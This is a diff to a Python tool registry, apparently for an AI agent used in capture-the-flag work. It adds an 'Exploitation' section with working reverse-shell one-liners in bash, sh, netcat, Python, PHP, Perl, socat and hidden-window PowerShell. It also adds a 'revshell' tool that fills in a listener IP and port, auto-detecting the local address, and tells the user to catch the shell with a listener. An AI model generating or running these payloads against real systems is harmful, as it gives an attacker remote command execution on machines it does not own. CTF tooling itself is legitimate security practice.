@@ -11,7 +11,7 @@ Execution model
 - http_request             : network I/O, goes through the gate
 - finish                   : terminal action, no gate
 """
-import binascii, hashlib, os, subprocess, sys, threading, time, urllib.request, urllib.error
+import binascii, hashlib, os, socket, subprocess, sys, threading, time, urllib.request, urllib.error
 from typing import Any, Callable
 
 _registry: dict[str, dict] = {}
@@ -271,6 +271,52 @@ def http_request(
         return f"HTTP {e.code} {e.reason}\n{e.read(2048).decode(errors='replace')}", time.monotonic() - t0
     except Exception as e:
         return f"[http_request error] {e}", 0.0
+
+
+# ── Exploitation ─────────────────────────────────────────────────────────────
+
+# Reverse-shell one-liner templates (subset of ctf-rev; inert string generation).
+# {ip}/{port} are substituted with str.replace (NOT .format) so the literal { } in the
+# perl/powershell payloads survive untouched.
+_REVSHELLS = {
+    "bash":    "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+    "sh":      "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
+    "nc-mkfifo": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",
+    "nc-e":    "nc -e /bin/sh {ip} {port}",
+    "python3": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
+               "[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
+    "php":     "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "perl":    "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,"
+               "getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
+               "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'",
+    "socat":   "socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
+    "powershell": "powershell -nop -W hidden -c \"$c=New-Object System.Net.Sockets.TCPClient("
+                  "'{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,"
+                  "$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+                  "$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS> ');"
+                  "$s.Write($sb,0,$sb.Length);$s.Flush()}\"",
+}
+
+
+@_tool(
+    "revshell",
+    "Generate a reverse-shell one-liner (bash/sh/nc-mkfifo/nc-e/python3/php/perl/socat/powershell). "
+    "Inert string generation — does NOT connect. Catch it with `ctf-rev listen <port>`.",
+    '{"thought":"<reason>","tool":"revshell","args":{"shell":"bash","lhost":"10.10.14.3","lport":4444}}',
+)
+def revshell(shell: str = "bash", lhost: str = "", lport: int = 4444):
+    t0 = time.monotonic()
+    if shell not in _REVSHELLS:
+        return f"[revshell] unknown shell {shell!r}; try: {', '.join(_REVSHELLS)}", time.monotonic() - t0
+    if not lhost:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80)); lhost = s.getsockname()[0]; s.close()
+        except OSError:
+            lhost = "127.0.0.1"
+    payload = _REVSHELLS[shell].replace("{ip}", lhost).replace("{port}", str(lport))
+    return (f"{payload}\n\n# catch it:  ctf-rev listen {lport}   (LHOST={lhost})",
+            time.monotonic() - t0)
 
 
 # ── Terminal ───────────────────────────────────────────────────────────────────
